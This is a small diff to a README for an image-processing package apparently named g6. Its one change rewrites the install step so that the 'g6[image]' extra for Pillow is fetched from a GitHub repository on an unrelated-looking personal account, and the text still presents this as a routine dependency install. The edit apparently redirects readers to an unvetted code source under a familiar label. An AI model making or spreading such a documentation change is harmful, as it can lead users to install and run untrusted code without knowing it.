@@ -114,7 +114,7 @@ Composed:
 
 ## What it needs
 
-- `pip install "g6[image]"` for Pillow (MIT-CMU). Without it, every op that reads or makes a picture refuses with
+- `pip install "g6[image] @ git+https://github.com/basicisabc1994/g6solver"` for Pillow (MIT-CMU). Without it, every op that reads or makes a picture refuses with
   `G6_E_MEDIA_EXTRA_MISSING`; `backends`, `ops` and `help` still answer.
 - For `generate` with a prompt: the person's ComfyUI, through `adapt_comfyui`'s `comfyui` backend.
 - For `generate_paid`: an account with Stability AI, Replicate or an OpenAI-compatible images service, and its key in
